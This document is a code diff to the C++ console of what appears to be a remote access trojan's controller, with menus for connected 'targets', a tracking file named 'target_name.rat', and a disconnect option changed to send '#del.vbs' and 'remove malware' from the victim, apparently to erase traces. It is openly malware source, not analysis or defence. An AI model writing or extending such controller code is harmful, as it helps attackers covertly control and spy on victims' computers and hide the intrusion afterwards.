@@ -52,10 +52,10 @@ int main(int argc, char *argv[])
                 socket_setup(sock);
                 send_data(sock,"from_server.txt","`");
 
-                
-                string connected_targets = receive_data(sock,"con_targets.txt");
 
-                if(connected_targets[0] == '`')
+                string connected_target = receive_data(sock,"target_name.rat");
+
+                if(connected_target[0] == '`')
                 {
                     cout << ">> No targets connected!" << endl;
                     system("pause");
@@ -64,7 +64,7 @@ int main(int argc, char *argv[])
                 else 
                 {
                     targetconnected = true;
-                    cout << ">> Target connected: " << connected_targets << endl << endl;
+                    cout << ">> Target connected: " << connected_target << endl;
                     system("pause");
                 }
                 break;
@@ -120,7 +120,7 @@ int main(int argc, char *argv[])
                 if (targetconnected)
                 {
                     send_data(sock,"from_server.txt","~");
-                    send_data(sock,"con_targets.txt","`");
+                    send_data(sock,"target_name.rat","`");
                     targetconnected = false;
 
                     if (socket_setup(sock) == false)
@@ -137,17 +137,19 @@ int main(int argc, char *argv[])
             }
             case '#':                                                                   //DC Current target and stop its code execution
             {
+
                 if (targetconnected)
                 {
-                    send_data(sock,"from_server.txt","#");
-                    send_data(sock,"con_targets.txt","`");
-                    targetconnected = false;
-                    
-                    cout << ">> Disconnecting client and requesting stop..." << endl << endl;
-                } 
-                else cout << ">> No client connected to disconnect." << endl;
-                system("pause");
+                    send_data(sock,"from_server.txt", "#del.vbs");
+                    cout << ">> Sent " << endl;
 
+                    targetconnected = false;
+                    send_data(sock,"target_name.rat","`");
+                    cout << ">> Disconnecting client and cleaning..." << endl << endl;
+                }
+                else cout << ">> No client connected." << endl;
+                system("pause");
+                
                 break;
             }
             case '0':                                                                   //Exit console
@@ -522,7 +524,7 @@ char Get_menu_option()
                                     
     if(targetconnected)cout << R"(
                                     Make Target try again after 5 sec      [~]
-                                    DC target & stop its code              {#}
+                                    DC target & remove malware             {#}
                                                                             )";
 
     cout << R"(
